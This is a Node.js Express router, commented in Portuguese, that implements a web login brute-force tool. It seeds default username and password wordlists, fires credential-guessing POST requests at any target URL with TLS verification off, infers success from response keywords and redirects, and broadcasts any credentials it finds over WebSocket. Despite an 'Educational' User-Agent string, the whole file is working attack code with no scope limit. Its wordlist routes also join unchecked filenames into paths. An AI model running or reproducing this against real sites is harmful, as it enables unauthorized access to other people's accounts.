const express = require('express');
const router = express.Router();
const https = require('https');
const http = require('http');
const { URL } = require('url');
const querystring = require('querystring');
const fs = require('fs').promises;
const path = require('path');

// Diretório de wordlists
const WORDLISTS_DIR = path.join(__dirname, '../../wordlists/web');

// Função para fazer requisição POST para login
const attemptLogin = (url, username, password, options = {}) => {
  return new Promise((resolve, reject) => {
    try {
      const parsedUrl = new URL(url);
      const protocol = parsedUrl.protocol === 'https:' ? https : http;

      // Preparar dados do formulário
      const postData = querystring.stringify({
        [options.usernameField || 'username']: username,
        [options.passwordField || 'password']: password,
        ...(options.additionalFields || {})
      });

      const requestOptions = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData),
          'User-Agent': 'Educational-Web-Bruteforce-Tool/1.0',
          'Accept': 'text/html,application/json,*/*',
          ...options.headers
        },
        timeout: 10000,
        rejectUnauthorized: false
      };

      const startTime = Date.now();

      const req = protocol.request(requestOptions, (res) => {
        let data = '';

        res.on('data', (chunk) => {
          data += chunk;
          if (data.length > 1024 * 1024) { // 1MB max
            req.destroy();
          }
        });

        res.on('end', () => {
          const endTime = Date.now();

          // Detectar sucesso baseado em diferentes critérios
          let success = false;
          let reason = '';

          // Critério 1: Status code de sucesso (200, 302)
          if (res.statusCode === 200 || res.statusCode === 302) {
            // Verificar se não contém mensagens de erro
            const errorKeywords = [
              'invalid', 'incorrect', 'wrong', 'failed', 'error',
              'inválido', 'incorreto', 'errado', 'falhou', 'erro',
              'denied', 'negado', 'unauthorized', 'não autorizado'
            ];

            const successKeywords = [
              'dashboard', 'welcome', 'bem-vindo', 'success', 'sucesso',
              'logout', 'sair', 'profile', 'perfil', 'home'
            ];

            const dataLower = data.toLowerCase();
            const hasError = errorKeywords.some(keyword => dataLower.includes(keyword));
            const hasSuccess = successKeywords.some(keyword => dataLower.includes(keyword));

            if (!hasError || hasSuccess) {
              success = true;
              reason = 'Possível sucesso detectado (sem mensagens de erro)';
            } else {
              reason = 'Falha: Mensagens de erro detectadas no conteúdo';
            }
          } else if (res.statusCode === 401 || res.statusCode === 403) {
            reason = `Falha: Status ${res.statusCode} (Não autorizado)`;
          } else if (res.statusCode >= 400) {
            reason = `Falha: Status ${res.statusCode}`;
          }

          // Verificar redirecionamentos
          if (res.headers.location) {
            const location = res.headers.location.toLowerCase();
            if (location.includes('dashboard') || location.includes('home') || location.includes('admin')) {
              success = true;
              reason = `Sucesso: Redirecionado para ${res.headers.location}`;
            } else if (location.includes('login') || location.includes('error')) {
              reason = `Falha: Redirecionado para página de login/erro`;
            }
          }

          resolve({
            success,
            statusCode: res.statusCode,
            headers: res.headers,
            body: data.substring(0, 500), // Primeiros 500 chars
            responseTime: endTime - startTime,
            reason,
            location: res.headers.location
          });
        });
      });

      req.on('error', (error) => {
        resolve({
          success: false,
          error: error.message,
          responseTime: Date.now() - startTime,
          reason: `Erro: ${error.message}`
        });
      });

      req.on('timeout', () => {
        req.destroy();
        resolve({
          success: false,
          error: 'Request timeout',
          responseTime: Date.now() - startTime,
          reason: 'Timeout'
        });
      });

      req.write(postData);
      req.end();
    } catch (error) {
      resolve({
        success: false,
        error: error.message,
        reason: `Erro ao processar: ${error.message}`
      });
    }
  });
};

// Criar diretório de wordlists se não existir
const ensureWordlistsDir = async () => {
  try {
    await fs.mkdir(WORDLISTS_DIR, { recursive: true });
  } catch (error) {
    console.error('Erro ao criar diretório de wordlists:', error);
  }
};

// Inicializar wordlists padrão
const initDefaultWordlists = async () => {
  await ensureWordlistsDir();

  const defaultUsernames = `admin
administrator
root
user
test
demo
guest
login
webmaster
support
info
contact`;

  const defaultPasswords = `admin
password
123456
12345678
123456789
password123
admin123
root
test
demo
qwerty
abc123
letmein
welcome
admin@123
P@ssw0rd
Password1
Admin@123`;

  try {
    const usernamesPath = path.join(WORDLISTS_DIR, 'usernames.txt');
    const passwordsPath = path.join(WORDLISTS_DIR, 'passwords.txt');

    // Criar apenas se não existir
    try {
      await fs.access(usernamesPath);
    } catch {
      await fs.writeFile(usernamesPath, defaultUsernames);
    }

    try {
      await fs.access(passwordsPath);
    } catch {
      await fs.writeFile(passwordsPath, defaultPasswords);
    }
  } catch (error) {
    console.error('Erro ao criar wordlists padrão:', error);
  }
};

// Inicializar ao carregar o módulo
initDefaultWordlists();

// Listar wordlists disponíveis
router.get('/wordlists', async (req, res) => {
  try {
    await ensureWordlistsDir();
    const files = await fs.readdir(WORDLISTS_DIR);

    const wordlists = await Promise.all(
      files
        .filter(file => file.endsWith('.txt'))
        .map(async (file) => {
          const filePath = path.join(WORDLISTS_DIR, file);
          const content = await fs.readFile(filePath, 'utf-8');
          const lines = content.split('\n').filter(line => line.trim());

          return {
            name: file,
            path: filePath,
            size: lines.length,
            type: file.includes('username') || file.includes('user') ? 'usernames' : 'passwords'
          };
        })
    );

    res.json({
      wordlists,
      directory: WORDLISTS_DIR
    });
  } catch (error) {
    res.status(500).json({
      error: 'Failed to list wordlists',
      details: error.message
    });
  }
});

// Upload de wordlist
router.post('/wordlists/upload', express.json(), async (req, res) => {
  try {
    const { name, content, type } = req.body;

    if (!name || !content) {
      return res.status(400).json({ error: 'Name and content are required' });
    }

    await ensureWordlistsDir();

    const filename = name.endsWith('.txt') ? name : `${name}.txt`;
    const filePath = path.join(WORDLISTS_DIR, filename);

    await fs.writeFile(filePath, content);

    const lines = content.split('\n').filter(line => line.trim());

    res.json({
      success: true,
      wordlist: {
        name: filename,
        path: filePath,
        size: lines.length,
        type: type || 'unknown'
      }
    });
  } catch (error) {
    res.status(500).json({
      error: 'Failed to upload wordlist',
      details: error.message
    });
  }
});

// Ler conteúdo de uma wordlist
router.get('/wordlists/:filename', async (req, res) => {
  try {
    const filePath = path.join(WORDLISTS_DIR, req.params.filename);
    const content = await fs.readFile(filePath, 'utf-8');
    const lines = content.split('\n').filter(line => line.trim());

    res.json({
      filename: req.params.filename,
      content: lines,
      size: lines.length
    });
  } catch (error) {
    res.status(500).json({
      error: 'Failed to read wordlist',
      details: error.message
    });
  }
});

// Iniciar ataque de força bruta
router.post('/start', async (req, res) => {
  try {
    const {
      targetUrl,
      usernameWordlist,
      passwordWordlist,
      usernameField = 'username',
      passwordField = 'password',
      delay = 1000,
      maxAttempts = 100
    } = req.body;

    if (!targetUrl || !usernameWordlist || !passwordWordlist) {
      return res.status(400).json({
        error: 'Target URL and wordlists are required'
      });
    }

    // Validar URL
    try {
      new URL(targetUrl);
    } catch {
      return res.status(400).json({ error: 'Invalid URL' });
    }

    // Carregar wordlists
    const usernamesPath = path.join(WORDLISTS_DIR, usernameWordlist);
    const passwordsPath = path.join(WORDLISTS_DIR, passwordWordlist);

    const usernamesContent = await fs.readFile(usernamesPath, 'utf-8');
    const passwordsContent = await fs.readFile(passwordsPath, 'utf-8');

    const usernames = usernamesContent.split('\n').filter(line => line.trim());
    const passwords = passwordsContent.split('\n').filter(line => line.trim());

    const totalCombinations = Math.min(usernames.length * passwords.length, maxAttempts);

    // Retornar imediatamente e processar em background
    res.json({
      message: 'Brute force attack started',
      totalCombinations,
      usernames: usernames.length,
      passwords: passwords.length,
      estimatedTime: `~${Math.ceil((totalCombinations * delay) / 1000 / 60)} minutos`
    });

    // Processar em background
    let attemptCount = 0;
    let foundCredentials = null;

    const wss = req.app.get('wss');

    const broadcast = (message) => {
      if (wss) {
        wss.clients.forEach((client) => {
          if (client.readyState === 1) { // OPEN
            client.send(JSON.stringify(message));
          }
        });
      }
    };

    broadcast({
      type: 'webbruteforce_start',
      data: {
        targetUrl,
        totalCombinations,
        timestamp: new Date().toISOString()
      }
    });

    for (const username of usernames) {
      if (foundCredentials) break;

      for (const password of passwords) {
        if (attemptCount >= maxAttempts) {
          broadcast({
            type: 'webbruteforce_limit',
            data: {
              message: 'Limite máximo de tentativas atingido',
              attempts: attemptCount
            }
          });
          break;
        }

        attemptCount++;

        broadcast({
          type: 'webbruteforce_progress',
          data: {
            attempt: attemptCount,
            total: totalCombinations,
            username,
            password: '•'.repeat(password.length),
            percentage: Math.round((attemptCount / totalCombinations) * 100)
          }
        });

        const result = await attemptLogin(targetUrl, username, password, {
          usernameField,
          passwordField
        });

        broadcast({
          type: 'webbruteforce_attempt',
          data: {
            attempt: attemptCount,
            username,
            password: '•'.repeat(password.length),
            success: result.success,
            statusCode: result.statusCode,
            responseTime: result.responseTime,
            reason: result.reason
          }
        });

        if (result.success) {
          foundCredentials = {
            username,
            password,
            attempt: attemptCount,
            ...result
          };

          broadcast({
            type: 'webbruteforce_success',
            data: {
              message: '✅ CREDENCIAIS ENCONTRADAS!',
              username,
              password,
              attempt: attemptCount,
              statusCode: result.statusCode,
              location: result.location,
              reason: result.reason
            }
          });
          break;
        }

        // Delay entre tentativas para não sobrecarregar o servidor
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }

    if (!foundCredentials) {
      broadcast({
        type: 'webbruteforce_finished',
        data: {
          message: 'Ataque concluído - Nenhuma credencial encontrada',
          totalAttempts: attemptCount
        }
      });
    }

  } catch (error) {
    console.error('Erro no ataque de força bruta:', error);
    res.status(500).json({
      error: 'Brute force attack failed',
      details: error.message
    });
  }
});

// Testar configuração do formulário
router.post('/test-form', async (req, res) => {
  try {
    const { targetUrl, usernameField, passwordField } = req.body;

    if (!targetUrl) {
      return res.status(400).json({ error: 'Target URL is required' });
    }

    // Fazer uma requisição de teste com credenciais inválidas
    const result = await attemptLogin(targetUrl, 'test_user_invalid', 'test_pass_invalid', {
      usernameField: usernameField || 'username',
      passwordField: passwordField || 'password'
    });

    res.json({
      success: true,
      test: {
        statusCode: result.statusCode,
        responseTime: result.responseTime,
        hasError: result.body ? result.body.toLowerCase().includes('error') ||
                                result.body.toLowerCase().includes('invalid') : false,
        headers: result.headers,
        bodyPreview: result.body
      },
      message: 'Teste de formulário concluído. Verifique a resposta para configurar corretamente.'
    });
  } catch (error) {
    res.status(500).json({
      error: 'Form test failed',
      details: error.message
    });
  }
});

module.exports = router;
